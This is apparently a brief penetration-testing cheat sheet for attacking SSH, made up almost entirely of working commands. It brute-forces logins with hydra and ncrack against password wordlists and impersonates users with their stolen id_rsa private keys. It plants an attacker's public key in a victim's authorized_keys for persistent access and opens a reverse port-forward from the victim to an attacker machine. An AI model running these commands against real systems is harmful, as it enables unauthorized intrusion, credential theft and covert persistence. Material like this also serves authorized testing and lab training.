hydra (hail hydra)

    hydra -L users.txt -P passwords.txt -t 5 -v -V -e n -e s -o results.txt <ip> ssh

ncrack
```ncrack -U username -P /usr/share/wordlists/rockyou.txt -p ssh <ip>```

## Impersonating

If a user has a private key, copy id_rsa key to your machine and try to ssh as the user    
`ssh "<user>"@<ip> -p <port> -i <path to id_rsa>`

Otherwise you can create your own key and copy it to the victim like this:
```
ssh-keygen
cd /home/<user>/.ssh
cat id_rsa.pub > authorized_keys

ssh -i /root/.ssh/id_rsa <user>@<ip>
```
or like this:
```
echo "ssh-rsa AAAA[...snip...]MQGB root@kali" >> authorized_keys
```

## Port forwarding
On the victim machine connect to attacker machine and forward a port `<victim>:<port>` -> `<attacker>:<port>`    
`ssh root @ <attacker ip> -R 2222:127.0.1.1:2222`
